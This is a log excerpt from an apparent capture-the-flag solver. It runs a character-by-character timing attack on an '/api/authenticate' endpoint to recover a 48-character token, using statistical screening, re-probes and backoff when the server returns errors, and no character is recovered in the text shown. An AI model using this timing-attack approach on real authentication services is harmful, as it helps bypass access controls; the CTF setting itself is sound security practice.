+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 110ms)
+  [artifact] excluded 'f': phase-1 z=10.69; re-probe z=-1.17,-1.04
+[pulse] health=200 110ms
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] canary HTTP 502 -> breaker 115s
+[infra] recovered after 232.7s (canary ok, 107ms)
+[sprt] cand='3' llr=-138.15 n=1
+[pulse] health=502 101ms
+[sprt] cand='M' llr=-145.95 n=1
+[deep] 1/18 cand='n'
+[deep] 2/18 cand='g'
+[deep] 3/18 cand='0'
+[deep] 4/18 cand='n'
+[infra] STORM (rate=0.50) -> breaker 45s
+[supervisor 1 2026-08-24 00:02:02] launching solver
+[*] Target Endpoint: https://4ee4122a-edfa-4c64-82c8-ad115ac438a0.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='0'
+  [HTTP 502] wave watch; cadence 5.20s, cadence -> 5.20s (1/12)...
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 8/62] cand='7'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 118ms)
+[screen 12/62] cand='b'
+[pulse] health=200 106ms
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.7s (canary ok, 623ms)
+[screen 13/62] cand='c'
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] recovered after 45.1s (canary ok, 105ms)
+[screen 14/62] cand='d'
+[pulse] health=502 99ms
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+  [HTTP 502] wave watch; cadence 3.00s, cadence -> 3.00s (1/12)...
+[screen 31/62] cand='u'
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+  [HTTP 502] wave watch; cadence 3.00s, cadence -> 3.00s (1/12)...
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+  [HTTP 502] wave watch; cadence 3.00s, cadence -> 3.00s (1/12)...
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+  [HTTP 502] wave watch; cadence 3.00s, cadence -> 3.00s (1/12)...
+[pulse] health=200 109ms
+[screen 40/62] cand='D'
+  [HTTP 502] wave watch; cadence 3.90s, cadence -> 3.90s (1/12)...
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+  [HTTP 502] wave watch; cadence 6.59s, cadence -> 6.59s (1/12)...
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+  [HTTP 502] wave watch; cadence 8.57s, cadence -> 8.57s (1/12)...
+[screen 47/62] cand='K'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 112ms)
+[screen 51/62] cand='O'
+[pulse] health=502 106ms
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 104ms)
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[infra] STORM (rate=0.58) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] canary HTTP 502 -> breaker 115s
+[infra] recovered after 241.5s (canary ok, 107ms)
+[screen 54/62] cand='R'
+[pulse] health=502 107ms
+[pulse] health=502 -> paused 600s
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 62/62] cand='Z'
+[guard] re-probe 'b' (1/2)
+[guard] re-probe 'b' (2/2)
+  [artifact] excluded 'b': phase-1 z=43.60; re-probe z=-0.91,-1.10
+[guard] re-probe 'p' (1/2)
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[guard] re-probe 'p' (2/2)
+  [artifact] excluded 'p': phase-1 z=13.65; re-probe z=-0.33,0.02
+[guard] re-probe 'a' (1/2)
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 101ms)
+[guard] re-probe 'a' (2/2)
+  [artifact] excluded 'a': phase-1 z=8.70; re-probe z=-0.64,0.14
+[guard] re-probe 'k' (1/2)
+[guard] re-probe 'k' (2/2)
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [artifact] excluded 'k': phase-1 z=8.47; re-probe z=0.08,-0.20
+[guard] re-probe 'l' (1/2)
+[guard] re-probe 'l' (2/2)
+  [artifact] excluded 'l': phase-1 z=8.41; re-probe z=-0.24,0.03
+[guard] re-probe '0' (1/2)
+[guard] re-probe '0' (2/2)
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [artifact] excluded '0': phase-1 z=8.17; re-probe z=-0.57,-0.08
+[guard] re-probe '6' (1/2)
+[guard] re-probe '6' (2/2)
+  [artifact] excluded '6': phase-1 z=8.17; re-probe z=-0.67,-0.76
+[guard] re-probe '4' (1/2)
+[guard] re-probe '4' (2/2)
+  [artifact] excluded '4': phase-1 z=8.11; re-probe z=-0.23,-0.13
+[sprt] cand='1' llr=-12.00 n=1
+[sprt] cand='2' llr=-13.54 n=1
+[deep] 1/30 cand='b'
+  [HTTP 502] wave watch; cadence 7.65s, cadence -> 7.65s (1/12)...
+[deep] 2/30 cand='p'
+[deep] 3/30 cand='a'
+[deep] 4/30 cand='b'
+  [HTTP 502] wave watch; cadence 7.65s, cadence -> 7.65s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 7.65s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[deep] 5/30 cand='p'
+[deep] 6/30 cand='a'
+[deep] 7/30 cand='b'
+[deep] 8/30 cand='p'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[deep] 9/30 cand='a'
+[pulse] health=200 104ms
+[deep] 10/30 cand='b'
+[deep] 11/30 cand='p'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[deep] 12/30 cand='a'
+[deep] 13/30 cand='b'
+[deep] 14/30 cand='p'
+[deep] 15/30 cand='a'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[deep] 16/30 cand='b'
+[deep] 17/30 cand='p'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[deep] 18/30 cand='a'
+[deep] 19/30 cand='b'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[deep] 20/30 cand='p'
+[deep] 21/30 cand='a'
+[deep] 22/30 cand='b'
+[deep] 23/30 cand='p'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[deep] 24/30 cand='a'
+[deep] 25/30 cand='b'
+[pulse] health=200 101ms
+[deep] 26/30 cand='p'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[deep] 27/30 cand='a'
+[deep] 28/30 cand='b'
+[deep] 29/30 cand='p'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[deep] 30/30 cand='a'
+  [!] No relative winner: best=3.96z; re-running the full screen once...
+[screen 1/62] cand='0'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 2/62] cand='1'
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] recovered after 45.1s (canary ok, 108ms)
+[screen 3/62] cand='2'
+[pulse] health=200 100ms
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[infra] STORM (rate=0.50) -> breaker 45s
+[infra] canary HTTP 502 -> breaker 72s
+[infra] recovered after 117.2s (canary ok, 105ms)
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[pulse] health=200 113ms
+[screen 11/62] cand='a'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[pulse] health=502 115ms
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[screen 24/62] cand='n'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 31/62] cand='u'
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+  [HTTP 502] wave hold 20s, cadence -> 9.00s (2/12)...
+  [HTTP 502] wave hold 30s, cadence -> 9.00s (3/12)...
+[screen 34/62] cand='x'
+[pulse] health=200 107ms
+[screen 35/62] cand='y'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+  [HTTP 502] wave watch; cadence 9.00s, cadence -> 9.00s (1/12)...
+[supervisor 1 2026-08-24 07:45:12] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='0'
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[pulse] health=200 107ms
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+[pulse] health=200 95ms
+[screen 62/62] cand='Z'
+[guard] re-probe 'C' (1/2)
+[guard] re-probe 'C' (2/2)
+  [artifact] excluded 'C': phase-1 z=24.72; re-probe z=0.16,0.50
+[guard] re-probe 'w' (1/2)
+[guard] re-probe 'w' (2/2)
+  [artifact] excluded 'w': phase-1 z=20.03; re-probe z=-0.09,0.54
+[sprt] cand='q' llr=-84.08 n=1
+[sprt] cand='7' llr=-78.33 n=1
+[deep] 1/30 cand='C'
+[deep] 2/30 cand='w'
+[deep] 3/30 cand='q'
+[deep] 4/30 cand='C'
+[deep] 5/30 cand='w'
+[deep] 6/30 cand='q'
+[deep] 7/30 cand='C'
+[deep] 8/30 cand='w'
+[deep] 9/30 cand='q'
+[deep] 10/30 cand='C'
+[deep] 11/30 cand='w'
+[deep] 12/30 cand='q'
+[deep] 13/30 cand='C'
+[deep] 14/30 cand='w'
+[deep] 15/30 cand='q'
+[deep] 16/30 cand='C'
+[deep] 17/30 cand='w'
+[deep] 18/30 cand='q'
+[deep] 19/30 cand='C'
+[deep] 20/30 cand='w'
+[deep] 21/30 cand='q'
+[deep] 22/30 cand='C'
+[deep] 23/30 cand='w'
+[pulse] health=200 96ms
+[deep] 24/30 cand='q'
+[deep] 25/30 cand='C'
+[deep] 26/30 cand='w'
+[deep] 27/30 cand='q'
+[deep] 28/30 cand='C'
+[deep] 29/30 cand='w'
+[deep] 30/30 cand='q'
+  [!] No relative winner: best=2.90z; re-running the full screen once...
+[screen 1/62] cand='0'
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[pulse] health=200 117ms
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[pulse] health=200 367ms
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+[screen 62/62] cand='Z'
+[sprt] cand='v' llr=-174.93 n=1
+[sprt] cand='k' llr=-155.78 n=1
+[deep] 1/30 cand='v'
+[deep] 2/30 cand='k'
+[deep] 3/30 cand='d'
+[deep] 4/30 cand='v'
+[deep] 5/30 cand='k'
+[deep] 6/30 cand='d'
+[deep] 7/30 cand='v'
+[deep] 8/30 cand='k'
+[deep] 9/30 cand='d'
+[deep] 10/30 cand='v'
+[pulse] health=200 96ms
+[deep] 11/30 cand='k'
+[deep] 12/30 cand='d'
+[deep] 13/30 cand='v'
+[deep] 14/30 cand='k'
+[deep] 15/30 cand='d'
+[deep] 16/30 cand='v'
+[deep] 17/30 cand='k'
+[deep] 18/30 cand='d'
+[deep] 19/30 cand='v'
+[deep] 20/30 cand='k'
+[deep] 21/30 cand='d'
+[deep] 22/30 cand='v'
+[deep] 23/30 cand='k'
+[deep] 24/30 cand='d'
+[deep] 25/30 cand='v'
+[deep] 26/30 cand='k'
+[deep] 27/30 cand='d'
+[deep] 28/30 cand='v'
+[deep] 29/30 cand='k'
+[deep] 30/30 cand='d'
+[pulse] health=200 97ms
+[pulse] congestion cleared after 2 clean pulses
+[watch 07:59] no signal best_z=3.16 baseline=-1.39ms
+[screen 1/62] cand='0'
+[pulse] health=200 96ms
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[pulse] health=200 92ms
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+[pulse] health=200 97ms
+[screen 62/62] cand='Z'
+[guard] re-probe 'm' (1/2)
+[guard] re-probe 'm' (2/2)
+  [artifact] excluded 'm': phase-1 z=9.31; re-probe z=0.06,-1.00
+[guard] re-probe 'f' (1/2)
+[guard] re-probe 'f' (2/2)
+  [artifact] excluded 'f': phase-1 z=8.16; re-probe z=-0.65,0.79
+[sprt] cand='B' llr=-268.29 n=1
+[sprt] cand='4' llr=-246.52 n=1
+[deep] 1/30 cand='m'
+[deep] 2/30 cand='f'
+[deep] 3/30 cand='B'
+[deep] 4/30 cand='m'
+[deep] 5/30 cand='f'
+[deep] 6/30 cand='B'
+[deep] 7/30 cand='m'
+[deep] 8/30 cand='f'
+[deep] 9/30 cand='B'
+[deep] 10/30 cand='m'
+[deep] 11/30 cand='f'
+[deep] 12/30 cand='B'
+[deep] 13/30 cand='m'
+[deep] 14/30 cand='f'
+[deep] 15/30 cand='B'
+[deep] 16/30 cand='m'
+[deep] 17/30 cand='f'
+[deep] 18/30 cand='B'
+[deep] 19/30 cand='m'
+[deep] 20/30 cand='f'
+[deep] 21/30 cand='B'
+[deep] 22/30 cand='m'
+[deep] 23/30 cand='f'
+[pulse] health=200 94ms
+[deep] 24/30 cand='B'
+[deep] 25/30 cand='m'
+[deep] 26/30 cand='f'
+[deep] 27/30 cand='B'
+[deep] 28/30 cand='m'
+[deep] 29/30 cand='f'
+[deep] 30/30 cand='B'
+  [!] No relative winner: best=0.86z; re-running the full screen once...
+[screen 1/62] cand='0'
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[pulse] health=200 102ms
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[pulse] health=200 94ms
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+[screen 62/62] cand='Z'
+[guard] re-probe '9' (1/2)
+[guard] re-probe '9' (2/2)
+  [artifact] excluded '9': phase-1 z=14.14; re-probe z=0.36,0.22
+[guard] re-probe 'M' (1/2)
+[guard] re-probe 'M' (2/2)
+  [artifact] excluded 'M': phase-1 z=8.65; re-probe z=0.43,0.54
+[sprt] cand='P' llr=-50.21 n=1
+[supervisor 1 2026-08-24 08:13:35] launching solver
+[*] Target Endpoint: https://9e1dd596-b52e-40eb-aacd-5adb3e3fd2db.222.255.138.122.nip.io/api/authenticate
+[*] Token Length: 48; Charset Size: 62
+[*] Current Progress: '' (0/48)
+[*] Fresh sequential cadence: start 4.00s; State File: /home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/solver/state.json
+[screen 1/62] cand='0'
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[screen 24/62] cand='n'
+[screen 25/62] cand='o'
+[screen 26/62] cand='p'
+[screen 27/62] cand='q'
+[screen 28/62] cand='r'
+[screen 29/62] cand='s'
+[screen 30/62] cand='t'
+[screen 31/62] cand='u'
+[pulse] health=200 95ms
+[screen 32/62] cand='v'
+[screen 33/62] cand='w'
+[screen 34/62] cand='x'
+[screen 35/62] cand='y'
+[screen 36/62] cand='z'
+[screen 37/62] cand='A'
+[screen 38/62] cand='B'
+[screen 39/62] cand='C'
+[screen 40/62] cand='D'
+[screen 41/62] cand='E'
+[screen 42/62] cand='F'
+[screen 43/62] cand='G'
+[screen 44/62] cand='H'
+[screen 45/62] cand='I'
+[screen 46/62] cand='J'
+[screen 47/62] cand='K'
+[screen 48/62] cand='L'
+[screen 49/62] cand='M'
+[screen 50/62] cand='N'
+[screen 51/62] cand='O'
+[screen 52/62] cand='P'
+[screen 53/62] cand='Q'
+[screen 54/62] cand='R'
+[screen 55/62] cand='S'
+[screen 56/62] cand='T'
+[screen 57/62] cand='U'
+[screen 58/62] cand='V'
+[screen 59/62] cand='W'
+[screen 60/62] cand='X'
+[screen 61/62] cand='Y'
+[pulse] health=200 92ms
+[screen 62/62] cand='Z'
+[guard] re-probe 'O' (1/2)
+[guard] re-probe 'O' (2/2)
+  [artifact] excluded 'O': phase-1 z=377.65; re-probe z=-6.13,-5.95
+[guard] re-probe '4' (1/2)
+[guard] re-probe '4' (2/2)
+  [artifact] excluded '4': phase-1 z=9.54; re-probe z=-3.51,-4.36
+[sprt] cand='z' llr=-166.22 n=1
+[sprt] cand='k' llr=-147.94 n=1
+[deep] 1/30 cand='O'
+[deep] 2/30 cand='4'
+[deep] 3/30 cand='z'
+[deep] 4/30 cand='O'
+[deep] 5/30 cand='4'
+[deep] 6/30 cand='z'
+[deep] 7/30 cand='O'
+[deep] 8/30 cand='4'
+[deep] 9/30 cand='z'
+[deep] 10/30 cand='O'
+[deep] 11/30 cand='4'
+[deep] 12/30 cand='z'
+[deep] 13/30 cand='O'
+[deep] 14/30 cand='4'
+[deep] 15/30 cand='z'
+[deep] 16/30 cand='O'
+[deep] 17/30 cand='4'
+[deep] 18/30 cand='z'
+[deep] 19/30 cand='O'
+[deep] 20/30 cand='4'
+[deep] 21/30 cand='z'
+[deep] 22/30 cand='O'
+[deep] 23/30 cand='4'
+[pulse] health=200 142ms
+[deep] 24/30 cand='z'
+[deep] 25/30 cand='O'
+[deep] 26/30 cand='4'
+[deep] 27/30 cand='z'
+[deep] 28/30 cand='O'
+[deep] 29/30 cand='4'
+[deep] 30/30 cand='z'
+  [!] No relative winner: best=2.39z; re-running the full screen once...
+[screen 1/62] cand='0'
+[screen 2/62] cand='1'
+[screen 3/62] cand='2'
+[screen 4/62] cand='3'
+[screen 5/62] cand='4'
+[screen 6/62] cand='5'
+[screen 7/62] cand='6'
+[screen 8/62] cand='7'
+[screen 9/62] cand='8'
+[screen 10/62] cand='9'
+[screen 11/62] cand='a'
+[screen 12/62] cand='b'
+[screen 13/62] cand='c'
+[screen 14/62] cand='d'
+[screen 15/62] cand='e'
+[screen 16/62] cand='f'
+[screen 17/62] cand='g'
+[screen 18/62] cand='h'
+[screen 19/62] cand='i'
+[screen 20/62] cand='j'
+[screen 21/62] cand='k'
+[screen 22/62] cand='l'
+[screen 23/62] cand='m'
+[pulse] health=200 95ms
